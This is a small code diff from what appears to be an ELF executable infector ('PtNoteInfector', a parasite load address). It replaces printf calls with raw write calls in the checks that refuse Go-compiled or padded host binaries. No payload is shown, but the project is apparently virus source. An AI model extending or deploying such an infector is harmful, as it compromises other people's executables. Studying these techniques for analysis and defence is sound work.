@@ -4,7 +4,7 @@
 #include "common/file_descriptor.hh"
 #include "common/macros.hh"
 #include "common/math.hh"
-#include "nostdlib/stdio.hh"
+#include "nostdlib/unistd.hh"
 #include "nostdlib/string.hh"
 
 namespace vt::infector {
@@ -110,7 +110,8 @@ bool PtNoteInfector::analyze(std::span<const std::byte> host_mapping,
       const auto* name =
           reinterpret_cast<const char*>(shstrtab + cur_entry->sh_name);
       if (name[6] == 'g' && name[7] == 'o') {
-        printf(STR_LITERAL("cannot infect elf compiled from golang\n"));
+        auto s = STR_LITERAL("cannot infect elf compiled from golang\n");
+        vt::write(1, s, vt::strlen(s));
         return false;
       }
     }
@@ -122,7 +123,8 @@ bool PtNoteInfector::analyze(std::span<const std::byte> host_mapping,
   // binary distributed by bazel does this https://github.com/bazelbuild/bazel
   if (parasite_load_address_ <=
       host_mapping.size() - ehdr.e_shnum * ehdr.e_shentsize) {
-    printf(STR_LITERAL("gave up because there are bytes appended\n"));
+    auto s = STR_LITERAL("gave up because there are bytes appended\n");
+    vt::write(1, s, vt::strlen(s));
     return false;
   }
 
